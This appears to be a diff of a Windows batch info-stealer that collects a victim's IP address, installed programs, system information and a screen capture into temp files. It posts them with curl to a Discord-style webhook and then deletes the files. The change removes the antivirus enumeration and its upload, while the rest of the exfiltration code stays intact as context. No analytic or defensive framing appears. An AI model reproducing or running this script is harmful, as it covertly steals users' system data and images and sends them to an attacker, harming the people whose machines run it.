@@ -15,8 +15,6 @@ set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 ::gets a list of all installed programms
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
 
-::gets a list of all instaled antivirus
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List >%userprofile%\AppData\Local\Temp\antivirus.txt
 
 ::gets system informations
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -78,7 +76,6 @@ Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 ::sends all files
-curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\antivirus.txt %webhook%
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
@@ -180,7 +177,6 @@ del %userprofile%\AppData\Local\Temp\ipp.txt
 del %userprofile%\AppData\Local\Temp\sysi.txt 
 del %userprofile%\AppData\Local\Temp\System_INFO.txt 
 del %userprofile%\AppData\Local\Temp\netstat.txt 
-del %userprofile%\AppData\Local\Temp\antivirus.txt
 del %userprofile%\AppData\Local\Temp\test.ps1 
 del %userprofile%\AppData\Local\Temp\programms.txt 
 del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
